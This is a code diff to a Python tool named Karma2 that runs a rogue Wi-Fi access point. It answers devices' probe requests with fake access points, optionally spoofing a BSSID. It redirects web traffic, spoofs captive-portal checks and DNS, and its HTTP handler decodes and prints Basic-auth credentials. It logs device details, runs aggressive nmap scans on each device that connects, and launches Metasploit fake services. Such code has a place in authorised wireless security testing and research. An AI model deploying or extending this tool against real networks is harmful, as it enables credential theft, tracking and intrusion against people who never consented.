@@ -10,6 +10,7 @@ from datetime import datetime
 import BaseHTTPServer
 import urllib2
 import json
+import base64
 
 
 DEFAULT = '\033[49m\033[39m'
@@ -32,9 +33,12 @@ def parse_args():
     parser.add_argument("-m", "--monitor", help="Choose the monitor interface")
     parser.add_argument("-e", "--enable", help="Choose the monitor interface to enable")
     parser.add_argument("-a", "--hostapds", help="List of interfaces which will be used to create aps")
-    parser.add_argument("-n", "--name", help="start only this given essid")
+    parser.add_argument("-n", "--name", help="start only this given essid with optional bssid ie myWifi,00:27:22:35:07:70")
     parser.add_argument("-f", "--framework", help="path to the metasploit console")
     parser.add_argument("-t", "--tcpdump", action='store_true', help="run tcpdump on interface")
+    parser.add_argument("-o", "--offline", action='store_true', help="offline mode")
+    parser.add_argument("-r", "--redirections", help="List of redirections (default is 80:8080,443:8080")
+    parser.add_argument("-s", "--scan", action='store_true', help="run nmap on each new device")
     return parser.parse_args()
 
 class Karma2:
@@ -43,14 +47,15 @@ class Karma2:
 
   class Webserver(Thread):
     daemon=True
-    def __init__(self):
+    def __init__(self, port = 80):
       Thread.__init__(self)
+      self.port = port
 
     def run(self):
       print "run server"
       server_class=Karma2.HTTPServer
       handler_class=Karma2.HTTPRequestHandler
-      server_address = ('', 80)
+      server_address = ('', self.port)
       httpd = server_class(server_address, handler_class)
       httpd.serve_forever()
 
@@ -58,10 +63,80 @@ class Karma2:
     pass
 
   class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+    
+    
+    def log_message(self, format, *args):
+      pass
+    
+    def _parse_url(self):
+      # parse URL
+      path = self.path.strip('/')
+      sp = path.split('?')
+      if len(sp) == 2:
+          path, params = sp
+      else:
+          path, = sp
+          params = None
+      args = path.split('/')
+
+      return path,params,args
+    
+    
     def do_GET(self):
+      client = self.client_address[0]
+      path,params,args = self._parse_url()
+      host = self.headers.get('Host')
+      fullpath =  "%s/%s"%(host,path)
+      print "%s => %s"%(client,fullpath)
+      
+      if path == 'generate_204' or path == 'gen_204':
+        self.send_response(204)
+        self.end_headers()
+      elif path == 'ncsi.txt':
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write('Microsoft NCSI')
+      elif path == 'hotspot-detect.html':
+        data = '''<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+  <head>
+    <title>Success</title>
+  </head>
+  <body>Success</body>
+</html>'''
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(data)
+      else:
+        self.send_response(200)
+        self.end_headers()
+
+    def do_POST(self):
+      client = self.client_address[0]
+      path,params,args = self._parse_url()
+      host = self.headers.get('Host')
+      fullpath =  "%s%s"%(host,path)
+      print "%s => %s"%(client,fullpath)
+      try:
+        authorization = self.headers.get('Authorization').split(' ')
+        if authorization[0] == 'Basic':
+          user_password = base64.b64decode(authorization[1])
+          print "%s login is %s"%(fullpath,user_password)
+      except:
+        pass
+      
+      if host == 't.appsflyer.com' and path == 'api/v2.3/androidevent':
+        model = self.headers.get('model')
+        lang = self.headers.get('lang')
+        operator = self.headers.get('operator')
+        brand = self.headers.get('brand')
+        country = self.headers.get('country')
+        print "%s is using a %s %s using %s. Language is %s"%(client, brand, model, operator, lang)
+        
+        
       self.send_response(200)
       self.end_headers()
-
+      
   class WLANInterface:
     def __init__(self, iface):
       self.iface = iface
@@ -105,29 +180,32 @@ class Karma2:
       return self.base%200
 
   class AccessPoint(Thread):
-    def __init__(self, karma, ifhostapd, essid, timeout):
+    def __init__(self, karma, ifhostapd, essid, bssid, timeout):
       Thread.__init__(self)
       self.essid = essid
+      self.bssid = bssid
       self.karma = karma
       self.timeout = timeout
       self.ifhostapd = ifhostapd
 
       self.activity_ts = time.time()
 
-      iface,self.hostapd_process = self.create_hostapd_access_point(essid)
+      iface,self.hostapd_process = self.create_hostapd_access_point(essid, bssid)
       subnet = self.karma.get_unique_subnet()
       self.subnet = subnet
       self.setup_iface(iface,subnet)
       # redirect the following ports
-      self.setup_redirections(iface,80,8080)
-      self.setup_redirections(iface,443,8080)
+      for sport, dport in self.karma.redirections.iteritems():
+        self.setup_redirections(iface,sport,dport)
+        
       self.dhcpd_process = self.start_dhcpd(iface,subnet)
       self.dnswatch_process = self.start_dnswatch(iface)
+      self.nmaps = []
       if self.karma.tcpdump:
         self.start_tcp_dump()
 
     def start_tcp_dump(self):
-      logfile = "wifi-%s-%s.cap"%(self.ifhostapd.str(),datetime.now().strftime("%Y%m%d-%H%M%S"))
+      logfile = "wifi-%s-%s.cap"%(self.essid,datetime.now().strftime("%Y%m%d-%H%M%S"))
       print "[+] Starting tcpdump %s"%logfile
       cmd = ['tcpdump','-i', self.ifhostapd.str(), '-w', logfile]
       p = subprocess.Popen(cmd)
@@ -144,6 +222,11 @@ class Karma2:
           self.hostapd_process.wait()
           self.dnswatch_process.kill()
           self.dnswatch_process.wait()
+          
+          for p in self.nmaps:
+            p.kill()
+            p.wait()
+          
           self.karma.release_ap(self.essid)
           self.karma.ifhostapds.free_one(self.ifhostapd)
           self.karma.free_subnet(self.subnet)
@@ -163,8 +246,22 @@ class Karma2:
         dhcpfd = self.dhcpd_process.stderr.fileno()
         airfd = self.hostapd_process.stdout.fileno()
         dnswfd = self.dnswatch_process.stdout.fileno()
-
-        rlist,wlist,xlist = select([dhcpfd,airfd,dnswfd],[],[],1)
+        
+        files = [dhcpfd,airfd,dnswfd]
+        nmapsd = []
+        for n in self.nmaps:
+          nmapsd.append(n.stdout.fileno())
+        files.extend(nmapsd)
+        rlist,wlist,xlist = select(files,[],[],1)
+        i = 0
+        for n in nmapsd:
+          if n in rlist:
+            line = self.nmaps[i].stdout.readline()
+            if len(line) == 0:
+              continue
+            print line
+          i += 1
+          
         if dhcpfd in rlist:
           line = self.dhcpd_process.stderr.readline()
           if len(line) == 0:
@@ -174,6 +271,11 @@ class Karma2:
           if m is not None:
             ip,mac,name = m.groups()
             print "DHCPACK from %s (%s)"%(_ctxt(ip, GREEN),name)
+            if self.karma.scan:
+              try:
+                self.nmaps.append(self.nmap(ip))
+              except:
+                print "%s Unable to start nmap %s"%(_ctxt("[!]",RED))
             nclients += 1
           m = re.match(
             r".*([a-zA-Z0-9:]+)*disassociated due to inactivity*",line)
@@ -210,6 +312,16 @@ class Karma2:
 
           self.activity_ts = time.time()
 
+    def nmap(self, ip):
+      print "[+] nmapping %s"%ip
+      cmd = ['nmap', '--open', '-A', "%s"%ip]
+      p = subprocess.Popen(cmd
+      ,stdout=subprocess.PIPE
+      ,stderr=subprocess.PIPE
+      )
+      return p
+      
+
     def setup_redirections(self, iface, inport, outport):
       print "[+] Setting up (%s) %d to %d redirection"%(iface,inport,outport)
       cmd = ['iptables',
@@ -237,8 +349,10 @@ class Karma2:
         '-F', '%s,%s'%(subnet.range_lower(),subnet.range_upper()),
         '--dhcp-option=option:router,%s'%(subnet.gateway()),
         '--dhcp-option=option:dns-server,%s'%(subnet.gateway()),
-#'-R','--address=/#/%s'%(subnet.gateway())
       ]
+      if(self.karma.offline):
+        cmd.append('-R')
+        cmd.append('--address=/#/%s'%(subnet.gateway()))
       p = subprocess.Popen(cmd,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE)
@@ -258,7 +372,7 @@ class Karma2:
         stderr=subprocess.PIPE)
       return p
 
-    def create_hostapd_access_point(self, essid):
+    def create_hostapd_access_point(self, essid, bssid):
       print "[+] Creating (hostapd) AP %s"%_ctxt(essid,GREEN)
 
       interface = self.ifhostapd.str()
@@ -266,6 +380,8 @@ class Karma2:
 
       f = tempfile.NamedTemporaryFile(delete=False)
       f.write("ssid=%s\n"%(essid))
+      if bssid is not None:
+        f.write("bssid=%s\n"%(bssid))
       f.write("interface=%s\n"%(interface))
       f.write("channel=%s\n"%(channel))
       f.close()
@@ -290,7 +406,7 @@ class Karma2:
           iface, = m.groups()
           return iface,p
 
-  def __init__(self, ifgw, ifmon, ifhostapds = None, metasploit = None, tcpdump = None):
+  def __init__(self, ifgw, ifmon, ifhostapds = None, metasploit = None, tcpdump = None, redirections = None, offline = False, scan = False):
     self.ifmon = ifmon
     self.ifgw = ifgw
     self.ifhostapds = Karma2.WLANInterfaces(ifhostapds)
@@ -299,13 +415,23 @@ class Karma2:
     self.clear_iptables()
     self.setup_nat(ifgw)
     self.tcpdump = tcpdump
+    self.offline = offline
+    self.scan = scan
+    
+    self.redirections = {80:8080, 443:8080}
+    if redirections is not None:
+      r = redirections.split(',')
+      for re in r:
+        sport, dport = re.split(':')
+        self.redirections[int(sport)] = int(dport)
+        
     if metasploit is not None:
       self.start_metasploit(metasploit)
     
   def start_metasploit(self, console):
     print "[+] Starting metasploit"
     cmd = [console,'-r', 'run_fake_services.rb']
-    p = subprocess.Popen(cmd)
+    p = subprocess.Popen(cmd, stdin=subprocess.PIPE)
 
   def clear_iptables(self):
     print "[+] Clearing iptables rules"
@@ -340,19 +466,19 @@ class Karma2:
   def release_ap(self, essid):
     self.aps.pop(essid)
 
-  def create_ap(self, essid, timeout = 30):
+  def create_ap(self, essid, bssid = None, timeout = 30):
     iface = self.ifhostapds.get_one()
     if iface is None:
       return
-    ap = self.AccessPoint(self, iface, essid, timeout)
+    ap = self.AccessPoint(self, iface, essid, bssid, timeout)
     ap.daemon = True
     ap.start()
     self.register_ap(essid,ap)
 
-  def process_probe(self, essid):
+  def process_probe(self, essid, bssid = None):
     if (not essid in self.aps.keys()
             and not essid in self.FORBIDDEN_APS):
-            self.create_ap(essid)
+            self.create_ap(essid, bssid)
             
   def do_sniff(self):
     if 'http' in self.ifmon:
@@ -363,9 +489,14 @@ class Karma2:
           data = f.read()
           j =  json.loads(data)
           for p in j['current']['probes']:
-            self.process_probe(p['essid'])
+            bssid = None
+            try:
+              bssid = p['ap'][0]['bssid']
+            except:
+              pass
+            self.process_probe(p['essid'], bssid)
         except Exception as e:
-          print e
+          print "Probes %s"%e
         time.sleep(1)
     else:
       def _filter(packet):
@@ -377,8 +508,8 @@ class Karma2:
       
       sniff(prn=_filter,store=0)
 
-  def start_webserver(self):
-    ws = Karma2.Webserver()
+  def start_webserver(self, port):
+    ws = Karma2.Webserver(port)
     ws.start()
 
 if __name__ == '__main__':
@@ -390,13 +521,20 @@ if __name__ == '__main__':
  
   args.hostapds = args.hostapds.split(',')
 
-  km = Karma2(args.gateway, args.monitor, args.hostapds, args.framework, args.tcpdump)
+  km = Karma2(args.gateway, args.monitor, args.hostapds, args.framework, args.tcpdump, args.redirections, args.offline, args.scan)
 
-  #km.start_webserver()
+  if args.offline:
+    km.start_webserver(km.redirections[80])
 
   if args.name is not None:
     # 24h timeout
-    km.create_ap(args.name, 60*60*24)
+    essid = args.name.split(',')[0]
+    bssid = None
+    try:
+      bssid = args.name.split(',')[1]
+    except:
+      pass
+    km.create_ap(essid, bssid, 60*60*24)
   else:
     km.do_sniff()
 
